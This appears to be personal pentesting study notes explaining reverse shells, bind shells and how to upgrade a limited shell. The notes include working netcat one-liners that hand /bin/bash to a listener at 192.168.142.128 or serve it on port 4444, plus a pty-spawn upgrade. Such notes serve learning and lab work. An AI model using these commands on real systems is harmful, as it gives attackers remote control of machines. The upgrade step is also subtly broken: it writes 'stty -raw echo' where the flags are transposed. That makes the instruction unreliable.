>[!question] :What is Shell ?
Shell is a command-line interpreter that takes commands from Keyboard (i.e. aka provides an interface to the users to use OS)

<h2> Different Shell Types</h2>
 - Reverse Shell
 - Bind Shell 
 - Dumb Shell



<h2> Reverse Shell:</h2>
It's the most common shell  which provide access to a machine (i.e. When we say we pop a shell that means access to a machine).
- Reverse Shell means a `Victim Connects` To Us or a Target connects to us.
- Will Use Reverse Shell 95% of the time.

Reverse Shell   =       Attacker                                          Victim
                            nc -nvlp 4444                                   nc 192.168.142.128 4444 -e /bin/bash
Here the attacker will open a port and victim will establish a connection and will offer a bin bash to him.

# Upgrade a Dumb Reverse Shell into a Fully Functional Terminal

DUMB Shell is a shell that can't perform many things like autocomplete, backspace, and arrow keys movement.
This dumb shell will stop working if you use Ctrl + C.

Hence you have to upgrade it.

Usually there's python installed on the box, which allows you to use 
`python3 -c "__import__('pty').spawn('/bin/bash')" or similar.`

Afterwards, use Ctrl + Z  followed by stty -raw echo, then fg on bash, or 
```
stty -raw echo;fg 
```

Finally, type 
```
reset
```
Input your TERM var (usually xterm-256color).

Then you should have an interactive shell that allows Ctrl + C and history to function properly



<h2> Bind Shell:</h2>
Bind Shell => Means we connect to the target.
- Will use Bind Shell mostly on an External Assessment.

Bind Shell        =    Attacker                                              Victim
                           nc 192.168.142.128 4444                  nc -nvlp 4444 -e /bin/bash
Here the victim will be listening and will be offering up /bin/bash to the attacker.
